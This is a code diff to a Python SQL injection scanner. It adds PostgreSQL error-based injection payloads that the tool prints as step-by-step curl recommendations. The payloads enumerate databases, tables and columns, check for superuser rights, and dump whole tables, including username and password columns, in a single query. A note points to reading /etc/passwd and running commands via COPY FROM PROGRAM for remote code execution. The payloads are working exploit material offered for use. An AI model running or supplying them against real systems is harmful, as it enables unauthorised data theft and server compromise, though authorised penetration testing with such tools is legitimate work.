@@ -710,8 +710,11 @@ class SQLiScanner:
                 'curl': curl_cmd,
                 'purpose': step['purpose'],
                 'what_to_look_for': step['what_to_look_for'],
+                'critical_note': step.get('critical_note'),
+                'efficiency_note': step.get('efficiency_note'),
                 'iterate_note': step.get('iterate_note'),
-                'requires_input': step.get('requires_input')
+                'requires_input': step.get('requires_input'),
+                'example': step.get('example')
             })
 
         return formatted_steps
@@ -779,8 +782,11 @@ class SQLiScanner:
                 'curl': curl_cmd,
                 'purpose': step['purpose'],
                 'what_to_look_for': step['what_to_look_for'],
+                'critical_note': step.get('critical_note'),
+                'efficiency_note': step.get('efficiency_note'),
                 'iterate_note': step.get('iterate_note'),
-                'requires_input': step.get('requires_input')
+                'requires_input': step.get('requires_input'),
+                'example': step.get('example')
             })
 
         return formatted_steps
@@ -848,8 +854,11 @@ class SQLiScanner:
                 'curl': curl_cmd,
                 'purpose': step['purpose'],
                 'what_to_look_for': step['what_to_look_for'],
+                'critical_note': step.get('critical_note'),
+                'efficiency_note': step.get('efficiency_note'),
                 'iterate_note': step.get('iterate_note'),
-                'requires_input': step.get('requires_input')
+                'requires_input': step.get('requires_input'),
+                'example': step.get('example')
             })
 
         return formatted_steps
@@ -876,39 +885,74 @@ class SQLiScanner:
             {
                 'title': 'Extract Database Version',
                 'payload': "1' AND 1=CAST((SELECT version()) AS int)--",
-                'grep_pattern': '| grep -i "invalid input" -A2',
-                'purpose': 'PostgreSQL requires CAST() instead of CONVERT(). Error will reveal version.',
+                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
+                'purpose': 'PostgreSQL version detection for CVE matching',
                 'what_to_look_for': 'PostgreSQL version number in error message (e.g., "PostgreSQL 13.2 on x86_64-pc-linux-gnu")'
             },
             {
                 'title': 'Extract Current Database Name',
                 'payload': "1' AND 1=CAST((SELECT current_database()) AS int)--",
-                'grep_pattern': '| grep -i "invalid\\|error" -A2',
-                'purpose': 'Get database name for table enumeration',
+                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
+                'purpose': 'Get current database name for targeted enumeration',
                 'what_to_look_for': 'Database name in "invalid input syntax" error'
             },
             {
                 'title': 'Extract Current User',
                 'payload': "1' AND 1=CAST((SELECT current_user) AS int)--",
-                'grep_pattern': '| grep -i "invalid\\|error" -A2',
-                'purpose': 'Check privilege level (superuser access needed for RCE)',
-                'what_to_look_for': 'Username in error, check if ends with "postgres" (superuser)'
+                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
+                'purpose': 'Identify database user for privilege assessment',
+                'what_to_look_for': 'Username in error (e.g., "postgres", "webapp_user")'
             },
             {
-                'title': 'Enumerate Table Names',
-                'payload': "1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS int)--",
-                'grep_pattern': '| grep -i "invalid" -A2',
-                'purpose': 'Extract table names one by one',
-                'what_to_look_for': 'Table name in error. Iterate: Change OFFSET 0 to 1, 2, 3...',
-                'iterate_note': 'Change OFFSET 0 to 1, 2, 3... to enumerate all tables'
+                'title': 'Check Superuser Privileges ⚠️ CRITICAL',
+                'payload': "1' AND 1=CAST((SELECT CASE WHEN usesuper THEN 'superuser' ELSE 'not_superuser' END FROM pg_user WHERE usename=current_user) AS int)--",
+                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
+                'purpose': 'Determine if current user has superuser privileges (REQUIRED for RCE)',
+                'what_to_look_for': '"superuser" = Can use pg_read_file() and COPY FROM PROGRAM for RCE. "not_superuser" = Limited to data extraction',
+                'critical_note': 'If superuser: pg_read_file(\'/etc/passwd\') and COPY FROM PROGRAM \'whoami\' available'
             },
             {
-                'title': 'Extract Column Names',
-                'payload': "1' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='TABLENAME' LIMIT 1 OFFSET 0) AS int)--",
-                'grep_pattern': '| grep -i "invalid" -A2',
-                'purpose': 'Extract columns from discovered tables',
-                'what_to_look_for': 'Column name in error. Replace TABLENAME with actual table',
+                'title': 'Enumerate All Databases',
+                'payload': "1' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS int)--",
+                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
+                'purpose': 'List all databases on the PostgreSQL server',
+                'what_to_look_for': 'Comma-separated database names (explore each for sensitive data)',
+                'efficiency_note': 'Gets ALL databases in ONE query'
+            },
+            {
+                'title': 'Enumerate All Tables (Public Schema)',
+                'payload': "1' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)--",
+                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
+                'purpose': 'Get all user tables in public schema (excludes system tables)',
+                'what_to_look_for': 'Comma-separated table names (e.g., "users,posts,sessions")',
+                'efficiency_note': 'Gets ALL tables in ONE query, filters out pg_catalog noise'
+            },
+            {
+                'title': 'Enumerate All Columns for Table',
+                'payload': "1' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='TABLENAME') AS int)--",
+                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
+                'purpose': 'Get all columns for a specific table in one query',
+                'what_to_look_for': 'Comma-separated column names (e.g., "id,username,password,email")',
+                'requires_input': 'TABLENAME',
+                'efficiency_note': 'Gets ALL columns in ONE query instead of iterating'
+            },
+            {
+                'title': 'Count Records in Table',
+                'payload': "1' AND 1=CAST((SELECT 'Count: ' || COUNT(*)::text FROM TABLENAME) AS int)--",
+                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A3',
+                'purpose': 'Get total number of records to plan data extraction',
+                'what_to_look_for': 'Number after "Count: " in error (e.g., "Count: 4" = 4 records)',
                 'requires_input': 'TABLENAME'
+            },
+            {
+                'title': 'Dump Entire Table (All Records + All Columns)',
+                'payload': "1' AND 1=CAST((SELECT string_agg(col1::text || ',' || col2 || ',' || col3, ' | ') FROM TABLENAME) AS int)--",
+                'grep_pattern': '| grep -i "invalid\\|error\\|warning" -A5',
+                'purpose': 'Extract ALL data from table in a SINGLE query',
+                'what_to_look_for': 'Complete table contents: "row1_data | row2_data | row3_data"',
+                'requires_input': 'TABLENAME and replace col1,col2,col3 with actual column names',
+                'efficiency_note': 'Use ::text for numeric columns. Example: string_agg(id::text || \',\' || username || \',\' || password, \' | \')',
+                'example': 'For users(id,username,password): string_agg(id::text || \',\' || username || \',\' || password, \' | \') dumps all users'
             }
         ]
 
@@ -931,8 +975,11 @@ class SQLiScanner:
                 'curl': curl_cmd,
                 'purpose': step['purpose'],
                 'what_to_look_for': step['what_to_look_for'],
+                'critical_note': step.get('critical_note'),
+                'efficiency_note': step.get('efficiency_note'),
                 'iterate_note': step.get('iterate_note'),
-                'requires_input': step.get('requires_input')
+                'requires_input': step.get('requires_input'),
+                'example': step.get('example')
             })
 
         return formatted_steps
@@ -985,11 +1032,20 @@ class SQLiScanner:
             print(f"   {Colors.YELLOW}├─ Purpose:{Colors.END} {rec['purpose']}")
             print(f"   {Colors.YELLOW}└─ What to look for:{Colors.END} {rec['what_to_look_for']}")
 
+            if rec.get('critical_note'):
+                print(f"      {Colors.RED}⚠ CRITICAL:{Colors.END} {rec['critical_note']}")
+
+            if rec.get('efficiency_note'):
+                print(f"      {Colors.BLUE}⚡ Efficiency:{Colors.END} {rec['efficiency_note']}")
+
             if rec.get('iterate_note'):
                 print(f"      {Colors.BLUE}↻ Iterate:{Colors.END} {rec['iterate_note']}")
 
             if rec.get('requires_input'):
                 print(f"      {Colors.RED}⚠ Replace:{Colors.END} {rec['requires_input']} with actual value")
+
+            if rec.get('example'):
+                print(f"      {Colors.GREEN}📝 Example:{Colors.END} {rec['example']}")
 
     def scan_parameter(self, param, original_value=''):
         """Scan a single parameter for SQL injection"""
